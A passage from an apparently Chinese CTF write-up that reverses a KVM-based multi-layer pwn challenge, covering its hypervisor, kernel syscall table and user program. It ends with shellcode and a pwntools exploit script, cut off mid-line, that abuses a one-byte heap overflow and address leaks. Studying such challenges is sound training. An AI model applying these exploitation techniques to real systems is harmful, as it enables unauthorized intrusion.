class="title">kvm_segment</span> <span class="title">fs</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">gs</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">ss</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">tr</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">ldt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kvm_dtable</span> <span class="title">gdt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kvm_dtable</span> <span class="title">idt</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 cr0;</span><br><span class="line">  <span class="type">unsigned</span> __int64 cr2;</span><br><span class="line">  <span class="type">unsigned</span> __int64 cr3;</span><br><span class="line">  <span class="type">unsigned</span> __int64 cr4;</span><br><span class="line">  <span class="type">unsigned</span> __int64 cr8;</span><br><span class="line">  <span class="type">unsigned</span> __int64 efer;</span><br><span class="line">  <span class="type">unsigned</span> __int64 apic_base;</span><br><span class="line">  <span class="type">unsigned</span> __int64 interrupt_bitmap[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_GET_API_VERSION       _IO(KVMIO,   0x00)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_CREATE_VM             _IO(KVMIO,   0x01) <span class="comment">/* returns a VM fd */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_GET_VCPU_MMAP_SIZE    _IO(KVMIO,   0x04) <span class="comment">/* in bytes */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_CREATE_VCPU           _IO(KVMIO,   0x41)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_SET_USER_MEMORY_REGION _IOW(KVMIO, 0x46, struct kvm_userspace_memory_region)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_RUN                   _IO(KVMIO,   0x80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_GET_REGS              _IOR(KVMIO,  0x81, struct kvm_regs)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_SET_REGS              _IOW(KVMIO,  0x82, struct kvm_regs)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_GET_SREGS             _IOR(KVMIO,  0x83, struct kvm_sregs)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_SET_SREGS             _IOW(KVMIO,  0x84, struct kvm_sregs)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_EXIT_IO               2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_EXIT_HLT              5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KVM_EXIT_FAIL_ENTRY       9</span></span><br></pre></td></tr></table></figure><p>一个典型的<code>vm</code>调用如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 kvm 句柄</span></span><br><span class="line">kvm = open(<span class="string">&quot;/dev/kvm&quot;</span>, O_RDWR | O_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (kvm == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;/dev/kvm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确保是正确的 API 版本</span></span><br><span class="line">ret = ioctl(kvm, KVM_GET_API_VERSION, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;KVM_GET_API_VERSION&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (ret != <span class="number">12</span>)</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">&quot;KVM_GET_API_VERSION %d, expected 12&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一虚拟机</span></span><br><span class="line">vmfd = ioctl(kvm, KVM_CREATE_VM, (<span class="type">unsigned</span> <span class="type">long</span>)<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (vmfd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;KVM_CREATE_VM&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为这个虚拟机申请内存，并将代码（镜像）加载到虚拟机内存中</span></span><br><span class="line">mem = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!mem)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;allocating guest memory&quot;</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(mem, code, <span class="keyword">sizeof</span>(code));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为什么从 0x1000 开始呢，因为页表空间的前4K是留给页表目录</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span> =</span> &#123;</span><br><span class="line">    .slot = <span class="number">0</span>,</span><br><span class="line">    .guest_phys_addr = <span class="number">0x1000</span>,</span><br><span class="line">    .memory_size = <span class="number">0x1000</span>,</span><br><span class="line">    .userspace_addr = (<span class="type">uint64_t</span>)mem,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 设置 KVM 的内存区域</span></span><br><span class="line">ret = ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &amp;region);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;KVM_SET_USER_MEMORY_REGION&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建虚拟CPU</span></span><br><span class="line">vcpufd = ioctl(vmfd, KVM_CREATE_VCPU, (<span class="type">unsigned</span> <span class="type">long</span>)<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (vcpufd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;KVM_CREATE_VCPU&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 KVM 运行时结构的大小</span></span><br><span class="line">ret = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;KVM_GET_VCPU_MMAP_SIZE&quot;</span>);</span><br><span class="line">mmap_size = ret;</span><br><span class="line"><span class="keyword">if</span> (mmap_size &lt; <span class="keyword">sizeof</span>(*run))</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">&quot;KVM_GET_VCPU_MMAP_SIZE unexpectedly small&quot;</span>);</span><br><span class="line"><span class="comment">// 将 kvm run 与 vcpu 做关联，这样能够获取到kvm的运行时信息</span></span><br><span class="line">run = mmap(<span class="literal">NULL</span>, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!run)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;mmap vcpu&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取特殊寄存器</span></span><br><span class="line">ret = ioctl(vcpufd, KVM_GET_SREGS, &amp;sregs);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;KVM_GET_SREGS&quot;</span>);</span><br><span class="line"><span class="comment">// 设置代码段为从地址0处开始，我们的代码被加载到了0x0000的起始位置</span></span><br><span class="line">sregs.cs.base = <span class="number">0</span>;</span><br><span class="line">sregs.cs.selector = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// KVM_SET_SREGS 设置特殊寄存器</span></span><br><span class="line">ret = ioctl(vcpufd, KVM_SET_SREGS, &amp;sregs);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;KVM_SET_SREGS&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置代码的入口地址，相当于32位main函数的地址，这里16位汇编都是由0x1000处开始。</span></span><br><span class="line"><span class="comment">// 如果是正式的镜像，那么rip的值应该是类似引导扇区加载进来的指令</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">regs</span> =</span> &#123;</span><br><span class="line">    .rip = <span class="number">0x1000</span>,</span><br><span class="line">    .rax = <span class="number">2</span>,    <span class="comment">// 设置 ax 寄存器初始值为 2</span></span><br><span class="line">    .rbx = <span class="number">2</span>,    <span class="comment">// 同理</span></span><br><span class="line">    .rflags = <span class="number">0x2</span>,   <span class="comment">// 初始化flags寄存器，x86架构下需要设置，否则会粗错</span></span><br><span class="line">&#125;;</span><br><span class="line">ret = ioctl(vcpufd, KVM_SET_REGS, &amp;regs);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;KVM_SET_REGS&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开始运行虚拟机，如果是qemu-kvm，会用一个线程来执行这个vCPU，并加载指令</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 开始运行虚拟机</span></span><br><span class="line">    ret = ioctl(vcpufd, KVM_RUN, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">//错误检测</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在<code>pwn</code>题目中我们最为关心的是程序保护开启的情况，现在知道的<code>NEX</code>保护也就是不可执行保护是通过<code>ERREF</code>寄存器开启的，我们看一下该寄存器的定义</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201019181115.png" alt="图片无法显示，请联系作者" title=" "><p>我们看到<code>NXE</code>标志位是<code>1&lt;&lt;11,0x800</code>。通过<code>ioctl(vcpufd, KVM_SET_SREGS, &amp;sregs)</code>来设置寄存器的值，而<code>virtual</code>中并没有对该位进行设置，因此可以判断程序是没有开启<code>NX</code>保护的。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201019181915.png" alt="图片无法显示，请联系作者" title=" "><p>根据上面的<code>ioctl，request</code>的十六进制可以看到<code>vcpu</code>的运行是在偏移<code>0x171a</code>的位置。发生<code>EXIT_IO</code>的时候程序执行了两个函数</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201019183245.png" alt="图片无法显示，请联系作者" title=" "><p>由于第一个函数是输出错误，因此判断第二个函数是处理<code>IO</code>相关系统调用的函数，根据函数内部的输出信息结合<code>kernel</code>我们可以得到最终的<code>kernel</code>与<code>hypervisor</code>的交互情况。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201019183738.png" alt="图片无法显示，请联系作者" title=" "><h4 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h4><p>在逆向内核的部分的时候主要关注的有两个点</p><ul><li>内核地址空间，用户地址空间，页表</li><li>系统调用表。</li></ul><p>首先是<code>entry.s</code>，最开始的位置，从名称中我们也能看出来，该部分的代码应该是内核的起始代码，在代码中首先将参数取出，随后调用了一个函数，随后就一直执行<code>hlt</code>。该函数应该就是<code>kernel_main</code>函数。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201019190650.png" alt="图片无法显示，请联系作者" title=" "><p>结合源码来看<code>kernel_main</code>函数中首先是初始化了页表，接着初始化了内存分配器，注册系统调用，最后切换到用户空间</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201019191032.png" alt="图片无法显示，请联系作者" title=" "><p>我们看一下初始化页表的操作</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201019194315.png" alt="图片无法显示，请联系作者" title=" "><p>在初始化页表中，首先读取了<code>rc3</code>寄存器的值赋值给了<code>pml4</code></p><blockquote><p><code>cr3</code>寄存器是页目录基址寄存器，保存页表目录表的物理地址。<code>pml4</code>是页表四级映射表。</p></blockquote><p>从循环中可以看出空间的总共大小为<code>0x2000000</code>，该控件包含用户空间和内核空间。该部分的大小也可以从<code>virtual</code>中得到。从<code>int_allocator</code>函数的调用中我们可以得到内核空间的<code>BASE</code>地址为<code>0x8000000000</code>，<code>init_allocator</code>是做了一个<code>0x8000000000-0x8002000000</code>到<code>0x0-0x2000000</code>的映射。<code>init_allocator</code>中的<code>while</code>循环实际上是一个<code>memset</code>的过程。</p><p>接下来就是注册系统调用了，这里采用的是<code>__writemsr</code>函数来写模式定义寄存器(<code>Model Specific Register</code> (<code>wrmsr</code>) )，这里声明了<code>syscall</code>入口，也就是<code>syscall_entry</code>函数的地址</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201019200448.png" alt="图片无法显示，请联系作者" title=" "><p>注册完毕系统调用之后就是切换到用户空间执行<code>hellousr</code>。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201019201628.png" alt="图片无法显示，请联系作者" title=" "><h5 id="系统调用表"><a href="#系统调用表" class="headerlink" title="系统调用表"></a>系统调用表</h5><p>从<code>syscall_entry</code>中继续进行分析，该函数的特征也很明显，进行了一大堆的保存和恢复寄存器的操作，也就是<code>push/pop</code>。中间调用的函数就是<code>syscall_handler</code>了。从汇编代码中分析，主要是根据<code>rax</code>也就是系统调用号跳转到相应的函数去执行，函数的地址<code>= syscall_table+rax*8</code>。这样我们就找到了系统调用表。根据<code>64</code>位的系统调用号恢复出系统调用表</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201019202637.png" alt="图片无法显示，请联系作者" title=" "><p>其实该表就位于初始分析时棕黄色部分的起始位置。每一个<code>syscall</code>系统调用都会对应一个<code>hypervisor</code>的对应的处理函数。</p><h4 id="usr"><a href="#usr" class="headerlink" title="usr"></a>usr</h4><p>用户态程序很简单，当申请的<code>team=10</code>时，<code>edit name</code>编辑会造成一个字节溢出，覆写<code>solgan</code>的低一字节为<code>0</code>。</p><h3 id="bypass-userspace"><a href="#bypass-userspace" class="headerlink" title="bypass userspace"></a>bypass userspace</h3><p>多层穿透的题目一般有多个<code>flag</code>，相当于每一层都有一个<code>flag</code>，先从用户层看起，也就是<code>hellousr</code>。程序的漏洞很明显，在分配<code>team</code>超过<code>10</code>的时候会有一个字节的溢出，会将<code>slogan</code>指针的低一字节覆写为<code>0</code>，控制好堆布局就可以将该指针指向<code>team 9</code>的控制堆块，也就是可以通过<code>10</code>控制<code>9</code>实现任意地址的写，而又给出了<code>elf,libc,stack</code>三个地址中的一个地址，这里选择<code>elf</code>地址，通过任意地址写将<code>bss</code>段中判断泄露地址函数执行次数的变量改写，从而多次泄露得到<code>libc,stack</code>地址。之后通过任意地址写直接覆写返回地址为<code>rop chain</code>。正常情况下这里应该已经可以读取出<code>flag</code>来了。</p><p>但是<code>kernel</code>中对<code>open</code>的系统调用进行了处理，我们看一下</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201019204215.png" alt="图片无法显示，请联系作者" title=" "><p>只能打开特定的文件，这里看到对<code>flag</code>进行了处理，我们看一下<code>hook</code>函数</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/20201019204302.png" alt="图片无法显示，请联系作者" title=" "><p>程序首先打开了<code>flag</code>文件，接着<code>mmap</code>了一块内存，并将<code>flag</code>的内容读取到了<code>mmap</code>的地址空间中，并将该地址空间的权限设置为了<code>2</code>也就是仅可写的权限，最后返回给了用户<code>mmap</code>地址空间中的地址。</p><p>注意到是没有开启<code>NX</code>的，因此可以直接执行<code>shellcode</code>。因此我们的<code>rop chain</code>设置如下，不知道为什么最开始直接在<code>shellcode</code>中写<code>flag</code>不行（推测是地址的问题，不知道这东西怎么调试）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"><span class="comment"># shellcode += asm(&#x27;mov rbp,rax;&#x27;)</span></span><br><span class="line"><span class="comment"># shellcode += asm(shellcraft.mprotect(&#x27;rbp&#x27;, 0x1000, 7))</span></span><br><span class="line"><span class="comment"># shellcode += asm(shellcraft.write(1, &#x27;rbp&#x27;, 0x100))</span></span><br><span class="line"><span class="comment"># shellcode += asm(shellcraft.exit(0))</span></span><br><span class="line"></span><br><span class="line">shellcode += asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rbp, rax</span></span><br><span class="line"><span class="string">    mov rdi, rbp</span></span><br><span class="line"><span class="string">    mov rsi, 0x1000</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    mov rax, 0xa</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi, rbp</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    mov rax, 0x1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    flag: .string &quot;flag&quot;</span></span><br><span class="line"><span class="string">    buf:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./hellouser&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./hellouser&quot;</span>)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(argv=[<span class="string">&quot;./hellovirtual&quot;</span>, <span class="string">&quot;./hellokernel&quot;</span>, <span class="string">&quot;./ld.so.2&quot;</span>, <span class="string">&quot;./hellouser&quot;</span>])</span><br><span class="line">    <span class="comment"># p = process([file_path])</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0x13a8)\nb *$rebase(0x14da)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;10.104.255.213&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&quot;1&quot;</span>, name=<span class="string">b&quot;1\n&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;team name:&quot;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;slogan size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;team slogan:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;team id:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_content</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your team id:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;new slogan:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_name</span>(<span class="params">index, name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your team id:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;new name:&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>(<span class="params">index, magic_index</span>):</span><br><span class="line">    magic_dic = [<span class="string">&quot;stackbase&quot;</span>, <span class="string">&quot;codebase&quot;</span>, <span class="string">&quot;libcbase&quot;</span>]</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;4919&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your team id:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;do you want?&quot;</span>, magic_dic[magic_index])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic_limit_address = <span class="number">0x2030b8</span></span><br><span class="line">name = <span class="string">&quot;1&quot;</span> * <span class="number">0x1</span></span><br><span class="line">p.sendafter(<span class="string">&quot;you name:)&quot;</span>, name)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">b&quot;1&quot;</span>, cyclic(<span class="number">29</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0xa8</span>, <span class="string">b&quot;1&quot;</span>, cyclic(<span class="number">29</span>))</span><br><span class="line">add(<span class="number">0x8</span>, <span class="string">b&quot;1&quot;</span>, cyclic(<span class="number">29</span>))</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&quot;1&quot;</span>, cyclic(<span class="number">29</span>))</span><br><span class="line">edit_name(<span class="number">10</span>, <span class="string">b&quot;1&quot;</span> * <span class="number">29</span>)</span><br><span class="line">magic(<span class="number">10</span>, <span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[+]code: &quot;</span>)</span><br><span class="line">elf.address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>) - <span class="number">0xcba</span></span><br><span class="line">log.success(<span class="string">&quot;elf address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(elf.address)))</span><br><span class="line"></span><br><span class="line">payload = p64(<span 